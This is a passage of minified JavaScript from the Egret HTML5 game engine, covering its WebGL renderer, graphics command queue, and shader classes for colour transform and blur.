            this.strokeStyleColor && 0 < a && this.commandQueue[a - 1] != this.endLineCommand && (this.createEndLineCommand(), this._pushCommand(this.endLineCommand), a = this.commandQueue.length);
            for (var c = 0; c < a; c++) {
                var d = this.commandQueue[c];
                d.method.apply(d.thisObject, d.args)
            }
            b.restore();
            this._dirty = !1
        }
    };
    var d = function () {
        return function (b, a, c) {
            this.method = b;
            this.thisObject = a;
            this.args = c
        }
    }();
    d.prototype.__class__ = "egret_h5_graphics.Command";
    c._setStyle = function (b) {
        this.canvasContext.fillStyle = b;
        this.canvasContext.beginPath()
    };
    c.init = function () {
        for (var b in c)egret.Graphics.prototype[b] = c[b];
        egret.RendererContext.createRendererContext = function (a) {
            return new egret.HTML5CanvasRenderer(a, !1)
        }
    }
})(egret_h5_graphics || (egret_h5_graphics = {}));
egret_h5_graphics.init();
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            b.call(this);
            this.glID = this.gl = this.canvas = null;
            this.size = 2E3;
            this.vertices = null;
            this.vertSize = 5;
            this.indices = null;
            this.projectionY = this.projectionX = NaN;
            this.shaderManager = null;
            this.contextLost = !1;
            this.glContextId = 0;
            this.currentBlendMode = "";
            this.currentBaseTexture = null;
            this.currentBatchSize = 0;
            this.worldTransform = null;
            this.worldAlpha = 1;
            this.maskList = [];
            this.maskDataFreeList = [];
            this.graphicsIndexBuffer = this.graphicsBuffer = this.graphicsIndices = this.graphicsPoints =
                this.filterType = this.colorTransformMatrix = null;
            this.graphicsStyle = {};
            this.canvas = a || this.createCanvas();
            this.canvas.addEventListener("webglcontextlost", this.handleContextLost.bind(this), !1);
            this.canvas.addEventListener("webglcontextrestored", this.handleContextRestored.bind(this), !1);
            this.html5Canvas = document.createElement("canvas");
            this.canvasContext = new c.HTML5CanvasRenderer(this.html5Canvas);
            this.onResize();
            this.projectionX = this.canvas.width / 2;
            this.projectionY = -this.canvas.height / 2;
            a = 6 * this.size;
            this.vertices = new Float32Array(4 * this.size * this.vertSize);
            this.indices = new Uint16Array(a);
            for (var d = 0, n = 0; d < a; d += 6, n += 4)this.indices[d + 0] = n + 0, this.indices[d + 1] = n + 1, this.indices[d + 2] = n + 2, this.indices[d + 3] = n + 0, this.indices[d + 4] = n + 2, this.indices[d + 5] = n + 3;
            this.initWebGL();
            this.shaderManager = new c.WebGLShaderManager(this.gl);
            this.worldTransform = new c.Matrix;
            this.initAll()
        }

        __extends(a, b);
        a.prototype.onRenderFinish = function () {
            this._draw()
        };
        a.prototype.initAll = function () {
            a.isInit || (a.isInit = !0, egret_webgl_graphics.init(),
                c.TextField.prototype._makeBitmapCache = function () {
                    this.renderTexture || (this.renderTexture = new c.RenderTexture);
                    var a = this.getBounds(c.Rectangle.identity);
                    if (0 == a.width || 0 == a.height)return this._texture_to_render = null, !1;
                    this._bitmapData || (this._bitmapData = document.createElement("canvas"), this.renderContext = c.RendererContext.createRendererContext(this._bitmapData));
                    var b = a.width, a = a.height, d = c.MainContext.instance.rendererContext._texture_scale_factor, a = a / d, b = Math.round(b / d), a = Math.round(a), h = this._bitmapData;
                    h.width = b;
                    h.height = a;
                    h.style.width = b + "px";
                    h.style.height = a + "px";
                    this.renderContext._cacheCanvas && (this.renderContext._cacheCanvas.width = b, this.renderContext._cacheCanvas.height = a);
                    this._worldTransform.identity();
                    this._worldTransform.a = 1 / d;
                    this._worldTransform.d = 1 / d;
                    this.renderContext.setTransform(this._worldTransform);
                    this.worldAlpha = 1;
                    var h = c.RenderFilter.getInstance(), f = h._drawAreaList.concat();
                    h._drawAreaList.length = 0;
                    this.renderContext.clearScreen();
                    this.renderContext.onRenderStart();
                    c.RendererContext.deleteTexture(this.renderTexture);
                    this._colorTransform && this.renderContext.setGlobalColorTransform(this._colorTransform.matrix);
                    var g = this.mask || this._scrollRect;
                    g && this.renderContext.pushMask(g);
                    this._render(this.renderContext);
                    g && this.renderContext.popMask();
                    this._colorTransform && this.renderContext.setGlobalColorTransform(null);
                    c.RenderTexture.identityRectangle.width = b;
                    c.RenderTexture.identityRectangle.height = a;
                    h.addDrawArea(c.RenderTexture.identityRectangle);
                    this.renderContext.onRenderFinish();
                    h._drawAreaList = f;
                    this.renderTexture._bitmapData =
                        this._bitmapData;
                    this.renderTexture._sourceWidth = b;
                    this.renderTexture._sourceHeight = a;
                    this.renderTexture._textureWidth = this.renderTexture._sourceWidth * d;
                    this.renderTexture._textureHeight = this.renderTexture._sourceHeight * d;
                    this._texture_to_render = this.renderTexture;
                    return !0
                }, c.TextField.prototype._draw = function (a) {
                this.getDirty() && (this._texture_to_render = this.renderTexture, this._cacheAsBitmap = !0);
                c.DisplayObject.prototype._draw.call(this, a)
            }, c.RenderTexture.prototype.init = function () {
                this._bitmapData =
                    document.createElement("canvas");
                this.canvasContext = this._bitmapData.getContext("2d");
                this._webglBitmapData = document.createElement("canvas");
                this.renderContext = new c.WebGLRenderer(this._webglBitmapData)
            }, c.RenderTexture.prototype.setSize = function (a, b) {
                if (this._webglBitmapData) {
                    var d = this._webglBitmapData;
                    d.width = a;
                    d.height = b;
                    d.style.width = a + "px";
                    d.style.height = b + "px";
                    this.renderContext.projectionX = a / 2;
                    this.renderContext.projectionY = -b / 2;
                    this.renderContext.viewportScale = c.MainContext.instance.rendererContext._texture_scale_factor
                }
            },
                c.RenderTexture.prototype.end = function () {
                }, c.RenderTexture.prototype.drawToTexture = function (a, b, d) {
                var h = b || a.getBounds(c.Rectangle.identity);
                if (0 == h.width || 0 == h.height || b && (0 == b.width || 0 == b.height))return !1;
                "undefined" == typeof d && (d = 1);
                this._bitmapData || (this._bitmapData = document.createElement("canvas"), this.canvasContext = this._bitmapData.getContext("2d"), c.RenderTexture.WebGLCanvas || (c.RenderTexture.WebGLCanvas = document.createElement("canvas"), c.RenderTexture.WebGLRenderer = new c.WebGLRenderer(c.RenderTexture.WebGLCanvas)),
                    this._webglBitmapData = c.RenderTexture.WebGLCanvas, this.renderContext = c.RenderTexture.WebGLRenderer);
                var f = h.x, g = h.y;
                b = h.width;
                var h = h.height, h = h / d, k = c.MainContext.instance.rendererContext._texture_scale_factor;
                b = Math.round(b / d);
                h = Math.round(h);
                this.setSize(b, h);
                var l = this._bitmapData, m = b / k * d, p = h / k * d;
                l.width = m;
                l.height = p;
                l.style.width = m + "px";
                l.style.height = p + "px";
                this.begin();
                a._worldTransform.identity();
                l = a._anchorOffsetX;
                m = a._anchorOffsetY;
                if (0 != a._anchorX || 0 != a._anchorY)l = a._anchorX * b, m = a._anchorY *
                h;
                this._offsetX = f + l;
                this._offsetY = g + m;
                a._worldTransform.append(1, 0, 0, 1, -this._offsetX, -this._offsetY);
                a.worldAlpha = 1;
                f = c.MainContext.__use_new_draw;
                c.MainContext.__use_new_draw = !1;
                if (a instanceof c.DisplayObjectContainer)for (g = a._children, l = 0, m = g.length; l < m; l++)g[l]._updateTransform();
                this.renderContext.setTransform(a._worldTransform);
                g = c.RenderFilter.getInstance();
                l = g._drawAreaList.concat();
                g._drawAreaList.length = 0;
                m = this.renderContext.gl;
                m.viewport(0, 0, b, h);
                m.bindFramebuffer(m.FRAMEBUFFER, null);
                m.clearColor(0, 0, 0, 0);
                m.clear(m.COLOR_BUFFER_BIT);
                this.renderContext.onRenderStart();
                c.RendererContext.deleteTexture(this);
                a._filter && this.renderContext.setGlobalFilter(a._filter);
                a._colorTransform && this.renderContext.setGlobalColorTransform(a._colorTransform.matrix);
                (m = a.mask || a._scrollRect) && this.renderContext.pushMask(m);
                a._render(this.renderContext);
                this.renderContext._draw();
                c.MainContext.__use_new_draw = f;
                m && this.renderContext.popMask();
                a._colorTransform && this.renderContext.setGlobalColorTransform(null);
                a._filter && this.renderContext.setGlobalFilter(null);
                c.RenderTexture.identityRectangle.width = b;
                c.RenderTexture.identityRectangle.height = h;
                g.addDrawArea(c.RenderTexture.identityRectangle);
                this.renderContext.onRenderFinish();
                g._drawAreaList = l;
                this._sourceWidth = b / k * d;
                this._sourceHeight = h / k * d;
                this._textureWidth = b * d;
                this._textureHeight = h * d;
                this.canvasContext.drawImage(this._webglBitmapData, 0, 0, b, h, 0, 0, this._sourceWidth, this._sourceHeight);
                return !0
            })
        };
        a.prototype.createCanvas = function () {
            var a = c.Browser.getInstance().$("#egretCanvas");
            if (!a) {
                var b = document.getElementById(c.StageDelegate.canvas_div_name), a = c.Browser.getInstance().$new("canvas");
                a.id = "egretCanvas";
                b.appendChild(a)
            }
            c.MainContext.instance.stage.addEventListener(c.Event.RESIZE, this.onResize, this);
            return a
        };
        a.prototype.onResize = function () {
            var a = document.getElementById(c.StageDelegate.canvas_div_name);
            this.canvas && (this.canvas.width = c.MainContext.instance.stage.stageWidth, this.canvas.height = c.MainContext.instance.stage.stageHeight, this.canvas.style.width = a.style.width,
                this.canvas.style.height = a.style.height, this.projectionX = this.canvas.width / 2, this.projectionY = -this.canvas.height / 2);
            this.html5Canvas && (this.html5Canvas.width = c.MainContext.instance.stage.stageWidth, this.html5Canvas.height = c.MainContext.instance.stage.stageHeight, this.html5Canvas.style.width = a.style.width, this.html5Canvas.style.height = a.style.height)
        };
        a.prototype.handleContextLost = function () {
            this.contextLost = !0
        };
        a.prototype.handleContextRestored = function () {
            this.initWebGL();
            this.shaderManager.setContext(this.gl);
            this.contextLost = !1
        };
        a.prototype.initWebGL = function () {
            for (var b = {}, d, n = ["experimental-webgl", "webgl"], h = 0; h < n.length; h++) {
                try {
                    d = this.canvas.getContext(n[h], b)
                } catch (f) {
                }
                if (d)break
            }
            if (!d)throw Error(c.getString(1021));
            a.glID++;
            this.glID = a.glID;
            this.setContext(d)
        };
        a.prototype.setContext = function (a) {
            this.gl = a;
            a.id = this.glContextId++;
            this.vertexBuffer = a.createBuffer();
            this.indexBuffer = a.createBuffer();
            a.bindBuffer(a.ELEMENT_ARRAY_BUFFER, this.indexBuffer);
            a.bufferData(a.ELEMENT_ARRAY_BUFFER, this.indices,
                a.STATIC_DRAW);
            a.bindBuffer(a.ARRAY_BUFFER, this.vertexBuffer);
            a.bufferData(a.ARRAY_BUFFER, this.vertices, a.DYNAMIC_DRAW);
            a.disable(a.DEPTH_TEST);
            a.disable(a.CULL_FACE);
            a.enable(a.BLEND);
            a.colorMask(!0, !0, !0, !0)
        };
        a.prototype.start = function () {
            if (!this.contextLost) {
                var a = this.gl;
                a.activeTexture(a.TEXTURE0);
                a.bindBuffer(a.ARRAY_BUFFER, this.vertexBuffer);
                a.bindBuffer(a.ELEMENT_ARRAY_BUFFER, this.indexBuffer);
                var b;
                b = this.colorTransformMatrix ? this.shaderManager.colorTransformShader : "blur" == this.filterType ?
                    this.shaderManager.blurShader : this.shaderManager.defaultShader;
                this.shaderManager.activateShader(b);
                b.syncUniforms();
                a.uniform2f(b.projectionVector, this.projectionX, this.projectionY);
                var c = 4 * this.vertSize;
                a.vertexAttribPointer(b.aVertexPosition, 2, a.FLOAT, !1, c, 0);
                a.vertexAttribPointer(b.aTextureCoord, 2, a.FLOAT, !1, c, 8);
                a.vertexAttribPointer(b.colorAttribute, 2, a.FLOAT, !1, c, 16)
            }
        };
        a.prototype.clearScreen = function () {
            var a = this.gl;
            a.colorMask(!0, !0, !0, !0);
            for (var b = c.RenderFilter.getInstance().getDrawAreaList(),
                     d = 0, h = b.length; d < h; d++) {
                var f = b[d];
                a.viewport(f.x, f.y, f.width, f.height);
                a.bindFramebuffer(a.FRAMEBUFFER, null);
                a.clearColor(0, 0, 0, 0);
                a.clear(a.COLOR_BUFFER_BIT)
            }
            b = c.MainContext.instance.stage;
            a.viewport(0, 0, b.stageWidth, b.stageHeight);
            this.renderCost = 0
        };
        a.prototype.setBlendMode = function (a) {
            a || (a = c.BlendMode.NORMAL);
            if (this.currentBlendMode != a) {
                var b = c.RendererContext.blendModesForGL[a];
                b && (this._draw(), this.gl.blendFunc(b[0], b[1]), this.currentBlendMode = a)
            }
        };
        a.prototype.drawRepeatImage = function (a, b,
                                                d, h, f, g, k, l, m, p) {
            p = c.MainContext.instance.rendererContext._texture_scale_factor;
            h *= p;
            for (f *= p; g < l; g += h)for (var r = k; r < m; r += f) {
                var t = Math.min(h, l - g), s = Math.min(f, m - r);
                this.drawImage(a, b, d, t / p, s / p, g, r, t, s)
            }
        };
        a.prototype.drawImage = function (a, b, c, d, f, g, k, l, m, p) {
            void 0 === p && (p = void 0);
            if (!this.contextLost)if (void 0 !== p)this.drawRepeatImage(a, b, c, d, f, g, k, l, m, p); else {
                this.createWebGLTexture(a);
                p = a._bitmapData.webGLTexture[this.glID];
                if (p !== this.currentBaseTexture || this.currentBatchSize >= this.size - 1)this._draw(),
                    this.currentBaseTexture = p;
                var r = this.worldTransform, t = r.a, s = r.b, u = r.c, w = r.d, v = r.tx, y = r.ty;
                0 == g && 0 == k || r.append(1, 0, 0, 1, g, k);
                1 == d / l && 1 == f / m || r.append(l / d, 0, 0, m / f, 0, 0);
                g = r.a;
                k = r.b;
                l = r.c;
                m = r.d;
                p = r.tx;
                var x = r.ty;
                r.a = t;
                r.b = s;
                r.c = u;
                r.d = w;
                r.tx = v;
                r.ty = y;
                t = a._sourceWidth;
                s = a._sourceHeight;
                a = d;
                r = f;
                b /= t;
                c /= s;
                d /= t;
                f /= s;
                t = this.vertices;
                s = 4 * this.currentBatchSize * this.vertSize;
                u = this.worldAlpha;
                t[s++] = p;
                t[s++] = x;
                t[s++] = b;
                t[s++] = c;
                t[s++] = u;
                t[s++] = g * a + p;
                t[s++] = k * a + x;
                t[s++] = d + b;
                t[s++] = c;
                t[s++] = u;
                t[s++] = g * a + l * r + p;
                t[s++] =
                    m * r + k * a + x;
                t[s++] = d + b;
                t[s++] = f + c;
                t[s++] = u;
                t[s++] = l * r + p;
                t[s++] = m * r + x;
                t[s++] = b;
                t[s++] = f + c;
                t[s++] = u;
                this.currentBatchSize++
            }
        };
        a.prototype._draw = function () {
            if (0 != this.currentBatchSize && !this.contextLost) {
                var a = c.getTimer();
                this.start();
                var b = this.gl;
                b.bindTexture(b.TEXTURE_2D, this.currentBaseTexture);
                var d = this.vertices.subarray(0, 4 * this.currentBatchSize * this.vertSize);
                b.bufferSubData(b.ARRAY_BUFFER, 0, d);
                b.drawElements(b.TRIANGLES, 6 * this.currentBatchSize, b.UNSIGNED_SHORT, 0);
                this.currentBatchSize = 0;
                this.renderCost +=
                    c.getTimer() - a;
                c.Profiler.getInstance().onDrawImage()
            }
        };
        a.prototype.setTransform = function (a) {
            var b = this.worldTransform;
            b.a = a.a;
            b.b = a.b;
            b.c = a.c;
            b.d = a.d;
            b.tx = a.tx;
            b.ty = a.ty
        };
        a.prototype.setAlpha = function (a, b) {
            this.worldAlpha = a;
            this.setBlendMode(b)
        };
        a.prototype.createWebGLTexture = function (a) {
            a = a._bitmapData;
            a.webGLTexture || (a.webGLTexture = {});
            if (!a.webGLTexture[this.glID]) {
                var b = this.gl;
                a.webGLTexture[this.glID] = b.createTexture();
                b.bindTexture(b.TEXTURE_2D, a.webGLTexture[this.glID]);
                b.pixelStorei(b.UNPACK_PREMULTIPLY_ALPHA_WEBGL,
                    !0);
                b.texImage2D(b.TEXTURE_2D, 0, b.RGBA, b.RGBA, b.UNSIGNED_BYTE, a);
                b.texParameteri(b.TEXTURE_2D, b.TEXTURE_MAG_FILTER, b.LINEAR);
                b.texParameteri(b.TEXTURE_2D, b.TEXTURE_MIN_FILTER, b.LINEAR);
                b.texParameteri(b.TEXTURE_2D, b.TEXTURE_WRAP_S, b.CLAMP_TO_EDGE);
                b.texParameteri(b.TEXTURE_2D, b.TEXTURE_WRAP_T, b.CLAMP_TO_EDGE);
                b.bindTexture(b.TEXTURE_2D, null)
            }
        };
        a.prototype.pushMask = function (a) {
            this._draw();
            var b = this.gl;
            0 == this.maskList.length && b.enable(b.SCISSOR_TEST);
            a = this.getScissorRect(a);
            this.maskList.push(a);
            this.scissor(a.x, a.y, a.width, a.height)
        };
        a.prototype.getScissorRect = function (a) {
            var b = this.maskList[this.maskList.length - 1], d, h, f;
            b ? b.intersects(b) ? (d = Math.max(a.x + this.worldTransform.tx, b.x), h = Math.max(a.y + this.worldTransform.ty, b.y), f = Math.min(a.x + this.worldTransform.tx + a.width, b.x + b.width) - d, a = Math.min(a.y + this.worldTransform.ty + a.height, b.y + b.height) - h) : a = f = h = d = 0 : (d = a.x + this.worldTransform.tx, h = a.y + this.worldTransform.ty, f = a.width, a = a.height);
            (b = this.maskDataFreeList.pop()) ? (b.x = d, b.y = h, b.width =
                f, b.height = a) : b = new c.Rectangle(d, h, f, a);
            return b
        };
        a.prototype.popMask = function () {
            this._draw();
            var a = this.gl, b = this.maskList.pop();
            this.maskDataFreeList.push(b);
            b = this.maskList.length;
            0 != b ? (b = this.maskList[b - 1], (0 < b.width || 0 < b.height) && this.scissor(b.x, b.y, b.width, b.height)) : a.disable(a.SCISSOR_TEST)
        };
        a.prototype.scissor = function (a, b, d, h) {
            var f = this.gl;
            0 > d && (d = 0);
            0 > h && (h = 0);
            f.scissor(a, -b + c.MainContext.instance.stage.stageHeight - h, d, h)
        };
        a.prototype.setGlobalColorTransform = function (a) {
            if (this.colorTransformMatrix !=
                a && (this._draw(), this.colorTransformMatrix = a)) {
                a = a.concat();
                var b = this.shaderManager.colorTransformShader;
                b.uniforms.colorAdd.value.w = a.splice(19, 1)[0] / 255;
                b.uniforms.colorAdd.value.z = a.splice(14, 1)[0] / 255;
                b.uniforms.colorAdd.value.y = a.splice(9, 1)[0] / 255;
                b.uniforms.colorAdd.value.x = a.splice(4, 1)[0] / 255;
                b.uniforms.matrix.value = a
            }
        };
        a.prototype.setGlobalFilter = function (a) {
            this._draw();
            this.setFilterProperties(a)
        };
        a.prototype.setFilterProperties = function (a) {
            if (a)switch (this.filterType = a.type, a.type) {
                case "blur":
                    var b =
                        this.shaderManager.blurShader;
                    b.uniforms.blur.value.x = a.blurX;
                    b.uniforms.blur.value.y = a.blurY
            } else this.filterType = null
        };
        a.prototype.setupFont = function (a, b) {
            void 0 === b && (b = null);
            this.canvasContext.setupFont(a, b)
        };
        a.prototype.measureText = function (a) {
            return this.canvasContext.measureText(a)
        };
        a.prototype.renderGraphics = function (a) {
            this._draw();
            var b = this.gl, c = this.shaderManager.primitiveShader;
            this.graphicsPoints ? (this.graphicsPoints.length = 0, this.graphicsIndices.length = 0) : (this.graphicsPoints = [], this.graphicsIndices =
                [], this.graphicsBuffer = b.createBuffer(), this.graphicsIndexBuffer = b.createBuffer());
            this.updateGraphics(a);
            this.shaderManager.activateShader(c);
            b.blendFunc(b.ONE, b.ONE_MINUS_SRC_ALPHA);
            b.uniformMatrix3fv(c.translationMatrix, !1, this.worldTransform.toArray(!0));
            b.uniform2f(c.projectionVector, this.projectionX, -this.projectionY);
            b.uniform2f(c.offsetVector, 0, 0);
            b.uniform3fv(c.tintColor, [1, 1, 1]);
            b.uniform1f(c.alpha, this.worldAlpha);
            b.bindBuffer(b.ARRAY_BUFFER, this.graphicsBuffer);
            b.vertexAttribPointer(c.aVertexPosition,
                2, b.FLOAT, !1, 24, 0);
            b.vertexAttribPointer(c.colorAttribute, 4, b.FLOAT, !1, 24, 8);
            b.bindBuffer(b.ELEMENT_ARRAY_BUFFER, this.graphicsIndexBuffer);
            b.drawElements(b.TRIANGLE_STRIP, this.graphicsIndices.length, b.UNSIGNED_SHORT, 0);
            this.shaderManager.activateShader(this.shaderManager.defaultShader)
        };
        a.prototype.updateGraphics = function (a) {
            var b = this.gl;
            this.buildRectangle(a);
            b.bindBuffer(b.ARRAY_BUFFER, this.graphicsBuffer);
            b.bufferData(b.ARRAY_BUFFER, new Float32Array(this.graphicsPoints), b.STATIC_DRAW);
            b.bindBuffer(b.ELEMENT_ARRAY_BUFFER,
                this.graphicsIndexBuffer);
            b.bufferData(b.ELEMENT_ARRAY_BUFFER, new Uint16Array(this.graphicsIndices), b.STATIC_DRAW)
        };
        a.prototype.buildRectangle = function (a) {
            var b = a.x, c = a.y, d = a.w;
            a = a.h;
            var f = this.graphicsStyle.a, g = this.graphicsStyle.r * f, k = this.graphicsStyle.g * f, l = this.graphicsStyle.b * f, m = this.graphicsPoints, p = this.graphicsIndices, r = m.length / 6;
            m.push(b, c);
            m.push(g, k, l, f);
            m.push(b + d, c);
            m.push(g, k, l, f);
            m.push(b, c + a);
            m.push(g, k, l, f);
            m.push(b + d, c + a);
            m.push(g, k, l, f);
            p.push(r, r, r + 1, r + 2, r + 3, r + 3)
        };
        a.prototype.setGraphicsStyle =
            function (a, b, c, d) {
                this.graphicsStyle.r = a;
                this.graphicsStyle.g = b;
                this.graphicsStyle.b = c;
                this.graphicsStyle.a = d
            };
        a.glID = 0;
        a.isInit = !1;
        return a
    }(c.RendererContext);
    c.WebGLRenderer = d;
    d.prototype.__class__ = "egret.WebGLRenderer"
})(egret || (egret = {}));
var egret_webgl_graphics;
(function (c) {
    c.beginFill = function (b, a) {
        void 0 === a && (a = 1);
        this._pushCommand(new d(this._setStyle, this, [(b >> 16) / 255, ((b & 65280) >> 8) / 255, (b & 255) / 255, a]))
    };
    c.drawRect = function (b, a, c, q) {
        this._pushCommand(new d(function (a) {
            this.renderContext.renderGraphics(a)
        }, this, [{x: b, y: a, w: c, h: q}]));
        this.checkRect(b, a, c, q)
    };
    c.drawCircle = function (b, a, c) {
    };
    c.drawRoundRect = function (b, a, c, d, n, h) {
    };
    c.drawEllipse = function (b, a, c, d) {
    };
    c.lineStyle = function (b, a, c, d, n, h, f, g) {
    };
    c.lineTo = function (b, a) {
    };
    c.curveTo = function (b, a, c,
                          d) {
    };
    c.moveTo = function (b, a) {
    };
    c.clear = function () {
        this._maxY = this._maxX = this._minY = this._minX = this.commandQueue.length = 0
    };
    c.endFill = function () {
    };
    c._pushCommand = function (b) {
        this.commandQueue.push(b)
    };
    c._draw = function (b) {
        var a = this.commandQueue.length;
        if (0 != a)for (this.renderContext = b, b = 0; b < a; b++) {
            var c = this.commandQueue[b];
            c.method.apply(c.thisObject, c.args)
        }
    };
    var d = function () {
        return function (b, a, c) {
            this.method = b;
            this.thisObject = a;
            this.args = c
        }
    }();
    d.prototype.__class__ = "egret_webgl_graphics.Command";
    c._setStyle = function (b, a, c, d) {
        this.renderContext.setGraphicsStyle(b, a, c, d)
    };
    c.init = function () {
        for (var b in c)egret.Graphics.prototype[b] = c[b]
    }
})(egret_webgl_graphics || (egret_webgl_graphics = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.compileProgram = function (a, d, q) {
            q = b.compileFragmentShader(a, q);
            d = b.compileVertexShader(a, d);
            var n = a.createProgram();
            a.attachShader(n, d);
            a.attachShader(n, q);
            a.linkProgram(n);
            a.getProgramParameter(n, a.LINK_STATUS) || c.Logger.infoWithErrorId(1020);
            return n
        };
        b.compileFragmentShader = function (a, c) {
            return b._compileShader(a, c, a.FRAGMENT_SHADER)
        };
        b.compileVertexShader = function (a, c) {
            return b._compileShader(a, c, a.VERTEX_SHADER)
        };
        b._compileShader = function (a, b, d) {
            d =
                a.createShader(d);
            a.shaderSource(d, b);
            a.compileShader(d);
            return a.getShaderParameter(d, a.COMPILE_STATUS) ? d : (c.Logger.info(a.getShaderInfoLog(d)), null)
        };
        b.checkCanUseWebGL = function () {
            if (void 0 == b.canUseWebGL)try {
                var a = document.createElement("canvas");
                b.canUseWebGL = !!window.WebGLRenderingContext && !(!a.getContext("webgl") && !a.getContext("experimental-webgl"))
            } catch (c) {
                b.canUseWebGL = !1
            }
            return b.canUseWebGL
        };
        return b
    }();
    c.WebGLUtils = d;
    d.prototype.__class__ = "egret.WebGLUtils"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b(a) {
            this.defaultVertexSrc = "attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec2 aColor;\nuniform vec2 projectionVector;\nuniform vec2 offsetVector;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nconst vec2 center = vec2(-1.0, 1.0);\nvoid main(void) {\n   gl_Position = vec4( ((aVertexPosition + offsetVector) / projectionVector) + center , 0.0, 1.0);\n   vTextureCoord = aTextureCoord;\n   vColor = vec4(aColor.x, aColor.x, aColor.x, aColor.x);\n}";
            this.program = this.gl = null;
            this.fragmentSrc = "precision lowp float;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nuniform sampler2D uSampler;\nvoid main(void) {\ngl_FragColor = texture2D(uSampler, vTextureCoord) * vColor ;\n}";
            this.uniforms = null;
            this.gl = a;
            this.init()
        }

        b.prototype.init = function () {
            var a = this.gl, b = c.WebGLUtils.compileProgram(a, this.defaultVertexSrc, this.fragmentSrc);
            a.useProgram(b);
            this.uSampler = a.getUniformLocation(b, "uSampler");
            this.projectionVector = a.getUniformLocation(b, "projectionVector");
            this.offsetVector = a.getUniformLocation(b, "offsetVector");
            this.dimensions = a.getUniformLocation(b, "dimensions");
            this.aVertexPosition = a.getAttribLocation(b, "aVertexPosition");
            this.aTextureCoord = a.getAttribLocation(b, "aTextureCoord");
            this.colorAttribute = a.getAttribLocation(b, "aColor");
            -1 === this.colorAttribute && (this.colorAttribute = 2);
            this.attributes = [this.aVertexPosition, this.aTextureCoord, this.colorAttribute];
            for (var d in this.uniforms)this.uniforms[d].uniformLocation = a.getUniformLocation(b, d);
            this.initUniforms();
            this.program = b
        };
        b.prototype.initUniforms = function () {
            if (this.uniforms) {
                var a = this.gl, b, c;
                for (c in this.uniforms) {
                    b = this.uniforms[c];
                    var d = b.type;
                    "mat2" === d || "mat3" === d || "mat4" === d ? (b.glMatrix = !0, b.glValueLength = 1, "mat2" === d ? b.glFunc = a.uniformMatrix2fv : "mat3" === d ? b.glFunc = a.uniformMatrix3fv : "mat4" === d && (b.glFunc = a.uniformMatrix4fv)) : (b.glFunc = a["uniform" + d], b.glValueLength = "2f" === d || "2i" === d ? 2 : "3f" === d || "3i" === d ? 3 : "4f" === d || "4i" === d ? 4 : 1)
                }
            }
        };
        b.prototype.syncUniforms = function () {
            if (this.uniforms) {
                var a,
                    b = this.gl, c;
                for (c in this.uniforms)a = this.uniforms[c], 1 === a.glValueLength ? !0 === a.glMatrix ? a.glFunc.call(b, a.uniformLocation, a.transpose, a.value) : a.glFunc.call(b, a.uniformLocation, a.value) : 2 === a.glValueLength ? a.glFunc.call(b, a.uniformLocation, a.value.x, a.value.y) : 3 === a.glValueLength ? a.glFunc.call(b, a.uniformLocation, a.value.x, a.value.y, a.value.z) : 4 === a.glValueLength && a.glFunc.call(b, a.uniformLocation, a.value.x, a.value.y, a.value.z, a.value.w)
            }
        };
        return b
    }();
    c.EgretShader = d;
    d.prototype.__class__ = "egret.EgretShader"
})(egret ||
(egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            b.call(this, a);
            this.fragmentSrc = "precision mediump float;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nuniform float invert;\nuniform mat4 matrix;\nuniform vec4 colorAdd;\nuniform sampler2D uSampler;\nvoid main(void) {\nvec4 locColor = texture2D(uSampler, vTextureCoord) * matrix;\nif(locColor.a != 0.0){\nlocColor += colorAdd;\n}\ngl_FragColor = locColor;\n}";
            this.uniforms = {
                matrix: {type: "mat4", value: [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1]}, colorAdd: {
                    type: "4f",
                    value: {x: 0, y: 0, z: 0, w: 0}
                }
            };
            this.init()
        }

        __extends(a, b);
        return a
    }(c.EgretShader);
    c.ColorTransformShader = d;
    d.prototype.__class__ = "egret.ColorTransformShader"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            b.call(this, a);
            this.fragmentSrc = "precision mediump float;uniform vec2 blur;uniform sampler2D uSampler;varying vec2 vTextureCoord;void main(){gl_FragColor = vec4(0.0);gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2(-0.028 * blur.x, -0.028 * blur.y))) * 0.0044299121055113265;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2(-0.024 * blur.x, -0.024 * blur.y))) * 0.00895781211794;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2(-0.020 * blur.x, -0.020 * blur.y))) * 0.0215963866053;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2(-0.016 * blur.x, -0.016 * blur.y))) * 0.0443683338718;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2(-0.012 * blur.x, -0.012 * blur.y))) * 0.0776744219933;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2(-0.008 * blur.x, -0.008 * blur.y))) * 0.115876621105;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2(-0.004 * blur.x, -0.004 * blur.y))) * 0.147308056121;gl_FragColor += texture2D(uSampler, vTextureCoord) * 0.159576912161;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2( 0.004 * blur.x,  0.004 * blur.y))) * 0.147308056121;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2( 0.008 * blur.x,  0.008 * blur.y))) * 0.115876621105;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2( 0.012 * blur.x,  0.012 * blur.y))) * 0.0776744219933;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2( 0.016 * blur.x,  0.016 * blur.y))) * 0.0443683338718;gl_FragColor += 